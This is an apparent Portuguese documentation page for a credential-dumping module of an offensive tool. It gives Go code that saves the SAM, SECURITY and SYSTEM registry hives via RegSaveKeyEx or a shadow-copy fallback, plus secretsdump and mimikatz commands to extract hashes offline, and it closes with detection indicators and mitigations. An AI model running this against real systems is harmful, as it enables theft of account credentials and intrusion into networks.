    Registry Hives¶

    O que é¶

    O Windows armazena credenciais locais em três registry hives:

    • SAM (Security Account Manager): contém NTLM hashes de contas locais
    • SECURITY: contém cached domain credentials (DCC2 hashes), LSA secrets e chaves de serviço
    • SYSTEM: contém a boot key (SYSKEY) necessária para descriptografar as outras duas hives

    A técnica consiste em salvar essas hives em arquivos e parseá-las offline com ferramentas como secretsdump.py, mimikatz ou crackmapexec. Diferente do LSASS dumping, não lê a memória de nenhum processo -- trabalha com arquivos de registro do sistema operacional.

    Por que funciona¶

    As hives são arquivos binários que ficam bloqueados pelo sistema operacional enquanto o Windows está rodando. Não é possível simplesmente copiá-los com copy ou xcopy. Porém, duas APIs permitem extrair seu conteúdo:

    1. RegSaveKeyEx: API do Windows que salva uma registry key inteira em um arquivo. Requer SeBackupPrivilege.

    2. Volume Shadow Copy (VSS): Cria um snapshot do volume. O snapshot contém as hives desbloqueadas no caminho Windows\System32\config\.

    A relação entre as hives é criptográfica: o SYSTEM contém a boot key que descriptografa o SAM e o SECURITY. Sem as três hives juntas, a extração falha.

    Implementação no Wolfgang¶

    O módulo reg_hive_dump (pkg/module/credential/registry.go) itera sobre as três hives e tenta salvá-las com RegSaveKeyEx, usando VSS como fallback.

    Definição das hives¶

    func requiredHives() []hiveInfo {
    return []hiveInfo{
        {name: "SAM", regPath: `HKLM\SAM`},
        {name: "SECURITY", regPath: `HKLM\SECURITY`},
        {name: "SYSTEM", regPath: `HKLM\SYSTEM`},
    }
}

    Método primário: RegSaveKeyEx¶

    func platformSaveHive(ctx context.Context, hive hiveInfo, outPath string) error {
    winapi.EnableBackupPrivilege()

    key, err := registry.OpenKey(baseKey, subKey, registry.READ)
    // ...

    ret, _, callErr := procRegSaveKeyEx.Call(
        uintptr(key),
        uintptr(unsafe.Pointer(pathUTF16)),
        0,
        regLatestFormat,
    )
    if ret != 0 {
        // Fallback para VSS
        return platformSaveHiveVSS(ctx, hive, outPath)
    }
    return nil
}

    RegSaveKeyEx é a abordagem preferida porque:

    • Operação atômica e rápida
    • Não cria snapshots de volume inteiro
    • Menor footprint forense

    Fallback: Volume Shadow Copy¶

    Quando RegSaveKeyEx falha (permissões insuficientes, hive bloqueada por outro processo), o módulo cria um shadow copy via WMI e copia os arquivos diretamente:

    func platformSaveHiveVSS(ctx context.Context, hive hiveInfo, outPath string) error {
    createCmd := exec.CommandContext(ctx, "wmic", "shadowcopy", "call", "create", `Volume=C:\`)
    createCmd.Run()

    shadowPath, _ := latestShadowCopyPath(ctx)

    srcPath := filepath.Join(shadowPath, "Windows", "System32", "config", hive.name)
    return copyHiveFile(srcPath, outPath)
}

    O shadow copy contém o estado do filesystem em um ponto no tempo, incluindo as hives desbloqueadas. Após a cópia, o shadow copy pode ser removido.

    Output¶

    Os arquivos são salvos com nomes randomizados no diretório temporário:

    func hiveTempPath(name string) string {
    var buf [4]byte
    rand.Read(buf[:])
    return fmt.Sprintf("%s-%s.hiv", name, hex.EncodeToString(buf[:]))
}

    Resultado: SAM-a3b1c9d2.hiv, SECURITY-f7e8d6c5.hiv, SYSTEM-1a2b3c4d.hiv.

    Parsing offline¶

    Após exfiltração dos três arquivos, as credenciais podem ser extraídas com:

    # secretsdump.py (impacket)
secretsdump.py -sam SAM.hiv -security SECURITY.hiv -system SYSTEM.hiv LOCAL

# mimikatz
lsadump::sam /sam:SAM.hiv /security:SECURITY.hiv /system:SYSTEM.hiv

    Conteúdo das Hives¶

    Hive Conteúdo Uso em ataques
    SAM NTLM hashes de contas locais (Administrator, Guest, etc.) Pass-the-hash local, cracking offline
    SECURITY LSA secrets, cached domain logons (DCC2), service account keys Acesso a credenciais de domínio, chaves de serviço
    SYSTEM Boot key (SYSKEY), configurações de serviço Descriptografar SAM e SECURITY

    Detecção¶

    IOC Descrição
    RegSaveKeyExW em HKLM\SAM ou HKLM\SECURITY Chamada de API para salvar hives sensíveis
    wmic shadowcopy call create Criação de shadow copy (Sysmon Event ID 1)
    Sysmon Event ID 13 (Registry value set) Acesso de leitura a chaves de hive
    Arquivos .hiv em diretórios temporários Artefatos em disco
    Habilitação de SeBackupPrivilege Privilege escalation indicator

    Mitigações:

    • Credential Guard: Isola credenciais de domínio fora das hives tradicionais
    • LAPS (Local Administrator Password Solution): Randomiza senhas locais, reduzindo o valor dos hashes do SAM
    • Monitorar SeBackupPrivilege: Auditar atribuição desse privilégio
